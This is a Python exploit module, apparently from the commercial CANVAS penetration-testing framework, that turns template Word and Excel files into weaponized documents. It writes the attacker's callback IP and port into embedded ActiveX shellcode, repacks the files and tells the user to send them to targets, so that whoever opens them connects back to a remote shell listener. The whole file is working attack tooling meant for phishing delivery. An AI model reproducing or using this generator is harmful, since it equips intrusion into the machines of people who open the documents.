#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import os
import socket
import shutil
import zipfile
import logging
import tempfile

import canvasengine

from httpclientside import httpclientside
from exploitutils import *
from tcpexploit import *
from libs import yaml

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = None
        self.ip = None
        self.filename = ""
        self.fname_docx = ""
        self.fname_xlsx = ""

    def neededListenerTypes(self):
        from canvasengine import UNIVERSAL_MOSDEF
        return [UNIVERSAL_MOSDEF]

    def getargs(self):
        htons = lambda n: (n & 0xFF) << 8 | ((n >> 8) & 0xFF)
        # print(self.callback.ip)
        # print(self.callback.port)
        self.port = "%010d" % (htons(self.callback.port) << 16 | 0x0002)
        self.ip   = "%010d" % struct.unpack("<I", socket.inet_aton(self.callback.ip))[0]
        self.getarg("fname_docx")
        self.getarg("fname_xlsx")

    def replace_ip_port(self, path):
        data = None
        with open(path, "rb") as handle:
            data = handle.read()

        data = data.replace("3004497922", self.port)  # replace PORT in shellcode
        data = data.replace("0025405632", self.ip)    # replace IP in shellcode

        with open(path, "wb") as handle:
            handle.write(data)

    def run(self):
        self.getargs()
        tmp_dir_docx = tempfile.mktemp()
        tmp_dir_xlsx = tempfile.mktemp()

        # unpack docx and xlsx files
        with zipfile.ZipFile(os.path.join(module_path, "Resources", "template_xpl.docx"), "r") as handle:
            handle.extractall(tmp_dir_docx)

        with zipfile.ZipFile(os.path.join(module_path, "Resources", "template_xpl.xlsx"), "r") as handle:
            handle.extractall(tmp_dir_xlsx)

        # replace ip and port in our callback shellcode
        self.replace_ip_port(os.path.join(tmp_dir_docx, "word", "activeX", "activeX1.bin"))
        self.replace_ip_port(os.path.join(tmp_dir_xlsx, "xl", "activeX", "activeX1.bin"))

        # pack our docx and xlsx files and enjoy :)
        fname = shutil.make_archive(self.fname_docx, 'zip', tmp_dir_docx)
        try:
            os.remove(fname[:-4])
        except OSError:
            pass
        os.rename(fname, fname[:-4]) # remove .zip from filename
        logging.info("Created empty Office Word document: %s" % self.fname_docx)
        
        fname = shutil.make_archive(self.fname_xlsx, 'zip', tmp_dir_xlsx)
        try:
            os.remove(fname[:-4])
        except OSError:
            pass
        os.rename(fname, fname[:-4]) # remove .zip from filename
        logging.info("Created empty Office Excel document: %s" % self.fname_xlsx)

        logging.info('You can now edit these files and send them to your targets')
        self.setInfo("%s - done (success)" % NAME)
        return 1


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
    # if ret not in [0, 1, None]:
    #     ret.interact()
